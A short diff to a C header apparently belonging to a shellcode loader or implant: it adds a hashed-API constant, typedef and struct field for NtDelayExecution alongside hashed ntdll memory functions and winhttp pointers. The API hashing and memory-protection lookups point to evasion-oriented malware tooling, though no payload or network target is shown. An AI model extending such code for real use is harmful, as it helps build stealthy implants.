@@ -17,6 +17,7 @@
 #define NTALLOCATEVIRTUALMEMORY_HASH 0x6793c34c
 #define NTPROTECTVIRTUALMEMORY_HASH  0x082962c8
 #define NTFLUSHINSTRUCTIONCACHE_HASH 0x80183adf
+#define HASHED_NtDelayExecution      0x0a49084a
 
 
 #define HASHED_ntdll         0x22d3b5ed
@@ -118,6 +119,7 @@ typedef BOOL (WINAPI *pUnregisterWait)(HANDLE WaitHandle);
 
 typedef BOOL (WINAPI *pCloseHandle)(HANDLE hObject);
 typedef BOOL (WINAPI *pFreeLibrary)(HMODULE hLibModule);
+typedef NTSTATUS(NTAPI* pNtDelayExecution)(BOOL Alertable, PLARGE_INTEGER Delay);
 
 
 
@@ -140,6 +142,7 @@ typedef struct _Win32 {
     pNtAllocateVirtualMemory NtAllocateVirtualMemory;
     pNtFlushInstructionCache NtFlushInstructionCache;
     pNtFreeVirtualMemory NtFreeVirtualMemory;
+    pNtDelayExecution    NtDelayExecution;
 
     // winhttp
     pWinHttpOpen               WinHttpOpen;
